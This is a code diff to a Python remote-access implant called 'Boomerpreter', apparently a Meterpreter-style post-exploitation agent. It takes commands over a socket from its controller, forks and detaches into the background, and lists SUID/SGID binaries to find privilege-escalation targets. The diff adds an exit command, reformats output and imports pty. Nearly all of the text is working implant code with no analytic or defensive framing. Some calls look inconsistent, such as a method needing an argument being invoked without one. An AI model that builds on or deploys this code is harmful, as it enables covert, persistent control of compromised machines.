@@ -5,6 +5,7 @@ import glob
 import stat
 import os
 import sys
+import pty
 
 
 
@@ -12,16 +13,16 @@ class Boomerpreter:
     def __init__(self,s):
         self.socket = s
         self.channel = None
+        self.py_version = 3 if python_version().startswith("3") else 2
         self.options = {
         "suid_sgid": ["get_suid_sgid", True],
-        "channel": ["open_channel", False],
-        "interact": ["interact_channel", True]
+        "exit": ["exit", False]
         }
 
     def run(self):
         while True:
             data_rcv = self.socket.recv(1024)
-            if python_version().startswith("3"):
+            if self.py_version == 3:
                 data_rcv = data_rcv.decode()
             data_rcv = data_rcv.split()
             try:
@@ -36,6 +37,8 @@ class Boomerpreter:
                         data = getattr(self, opt[0])()
             except:
                 data = b"Error"
+            if "exit" == data:
+                break
             self.socket.send(data)
 
     def get_suid_sgid(self, request):
@@ -50,9 +53,9 @@ class Boomerpreter:
                     files_suid.append(result[0])
                 if result[1]:
                     files_sgid.append(result[1])
-        files_suid = ";".join(files_suid)
+        files_suid = "\n".join(files_suid)
         files_sgid = ";".join(files_sgid)
-        files = files_suid + "++" + files_sgid
+        files = "---SUID---\n" +files_suid + "\n---SGID---\n" + files_sgid
         response = files
         return response
 
@@ -72,10 +75,13 @@ class Boomerpreter:
         else:
             results.append(None)
         return results
+    
+    def exit(self):
+        self.socket.close()
+        return "exit"
+        
 
-
-boomerpreter = Boomerpreter(s)
-
+address = s.getpeername()
 if hasattr(os, 'fork'):
     pid = os.fork()
     if pid > 0:
@@ -88,7 +94,10 @@ if hasattr(os, 'fork'):
                 os.setsid()
             except OSError:
                 pass
+
+
 try:
+    boomerpreter = Boomerpreter(s)
     boomerpreter.run()
 except:
     pass
